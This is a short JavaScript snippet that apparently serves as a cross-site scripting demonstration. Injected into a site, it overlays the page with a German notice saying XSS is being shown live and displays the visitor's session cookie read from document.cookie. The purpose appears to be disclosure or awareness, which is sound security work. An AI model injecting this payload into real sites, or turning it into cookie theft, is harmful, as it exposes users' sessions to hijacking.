let newdiv = document.createElement("DIV")
let newparagraph = document.createElement("P")

newdiv.appendChild(newparagraph)
document.body.prepend(newdiv)

newdiv.style = " position: relative; " 

newparagraph.style=" height: 75vh; width: 75vw;position:absolute;top:0;z-index:1000;background-color: #555;  color:white;"

document.querySelector(".navbar.hw-navbar.navbar-fixed-top").style="position: unset !important;"

newparagraph.innerText= "Das Dokument ist nicht beschaedigt, Sie koennen weiterscrollen\n Der Link soll Ihnen XSS live zeigen. \n Ihr Session COokie fuer diese Webseite lautet " + document.cookie 


